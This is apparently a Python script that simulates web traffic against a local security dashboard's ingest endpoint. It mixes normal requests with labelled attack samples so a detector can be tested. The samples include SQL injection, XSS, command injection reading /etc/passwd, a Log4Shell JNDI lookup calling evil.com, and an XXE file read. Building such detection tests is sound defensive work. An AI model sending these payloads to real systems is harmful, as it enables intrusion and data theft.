import requests
import time
import random
import sys

BASE_URL = "http://localhost:8080/api/v1/ingest"

# Different simulated IPs to create diversity on the map
ATTACKER_IPS = [
    "1.2.3.4", "5.6.7.8", "11.22.33.44", "192.168.1.50", "203.0.113.1",
    "172.16.0.23", "10.10.10.10", "198.51.100.2", "45.33.22.11", "99.88.77.66"
]

NORMAL_IPS = [
    "192.168.1.100", "192.168.1.101", "10.0.0.5", "172.16.5.99", "127.0.0.1"
]

NORMAL_PATHS = ["/home", "/about", "/contact", "/products", "/login", "/api/data"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

def send_request(payload, ip, is_attack=False):
    headers = {
        "X-Forwarded-For": ip,
        "User-Agent": random.choice(USER_AGENTS)
    }
    try:
        # If headers has User-Agent it might override payload user_agent if backend prioritizes it?
        # Backend prioritizes JSON body for detection if present.
        # But let's add it to JSON too if missing.
        if "user_agent" not in payload:
            payload["user_agent"] = headers["User-Agent"]
            
        res = requests.post(BASE_URL, json=payload, headers=headers)
        if is_attack:
            action = res.json().get('action', 'allowed')
            status_icon = "🛑" if action == 'allowed' else "🚫"
            print(f"{status_icon} Sent Malicious ({res.json().get('attack_type', 'Unknown')}) from {ip} -> Action: {action.upper()}")
        else:
            action = res.json().get('action', 'allowed')
            if action == 'blocked':
                 print(f"🚫 Normal Request BLOCKED from {ip} (Firewall Active)")
            else:
                 print(f"✅ Sent Normal to {payload['path']} from {ip}")
    except Exception as e:
        print(f"❌ Error: {e}")

def run_simulation(duration_sec=60):
    print(f"🚀 Starting Real-Time Traffic Simulation for {duration_sec} seconds...")
    start_time = time.time()
    
    while time.time() - start_time < duration_sec:
        # batch: 5 Normal, 2 Malicious
        
        # 1. Normal Requests
        for _ in range(5):
            payload = {
                "path": random.choice(NORMAL_PATHS),
                "method": "GET",
                "body": ""
            }
            send_request(payload, random.choice(NORMAL_IPS))
            time.sleep(0.2)
            
        # 2. Malicious Request 1 (SQLi)
        sqli_payload = {
            "path": "/products",
            "method": "GET",
            "query": "id=1' OR '1'='1",
            "body": ""
        }
        send_request(sqli_payload, random.choice(ATTACKER_IPS), is_attack=True)
        time.sleep(0.5)
        
        # 3. Malicious Request 2 (XSS or other)
        # Randomize attack type for pie chart diversity
        attacks = [
            {"path": "/search", "query": "<script>alert(1)</script>", "type": "XSS"},
            {"path": "/admin", "body": "cat /etc/passwd", "type": "Command Inj"},
            {"path": "/login", "body": "${jndi:ldap://evil.com}", "type": "Log4Shell"},
            {"path": "/xml", "body": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>", "type": "XXE"}
        ]
        chosen = random.choice(attacks)
        payload = {
            "path": chosen["path"],
            "method": "POST",
            "query": chosen.get("query", ""),
            "body": chosen.get("body", "")
        }
        send_request(payload, random.choice(ATTACKER_IPS), is_attack=True)
        
        time.sleep(1) # Wait before next batch

    print("\n🏁 Simulation Complete.")

if __name__ == "__main__":
    run_simulation(60)
